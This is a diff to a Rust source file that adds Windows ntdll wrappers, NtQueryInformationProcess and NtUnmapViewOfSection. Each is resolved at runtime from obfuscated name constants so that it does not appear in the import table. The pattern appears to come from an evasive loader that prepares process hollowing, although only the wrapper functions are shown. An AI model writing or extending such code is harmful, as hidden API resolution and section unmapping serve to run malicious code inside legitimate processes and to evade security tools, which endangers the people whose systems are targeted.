@@ -355,3 +355,25 @@ pub unsafe fn EnumWindows(callback: *const c_void, lparam: isize) -> i32 {
     let f: F = std::mem::transmute(resolve(U32, crate::obf::W_ENUM_WINDOWS));
     f(callback, lparam)
 }
+
+// ── ntdll ────────────────────────────────────────────────────────────────
+
+#[cfg(windows)]
+pub unsafe fn NtQueryInformationProcess(
+    process: *mut c_void,
+    info_class: u32,
+    info: *mut c_void,
+    info_len: u32,
+    return_len: *mut u32,
+) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;
+    let f: F = std::mem::transmute(resolve(crate::obf::NTDLL, crate::obf::NT_QUERY_INFO_PROCESS));
+    f(process, info_class, info, info_len, return_len)
+}
+
+#[cfg(windows)]
+pub unsafe fn NtUnmapViewOfSection(process: *mut c_void, base_address: *mut c_void) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
+    let f: F = std::mem::transmute(resolve(crate::obf::NTDLL, crate::obf::NT_UNMAP_VIEW_OF_SECTION));
+    f(process, base_address)
+}
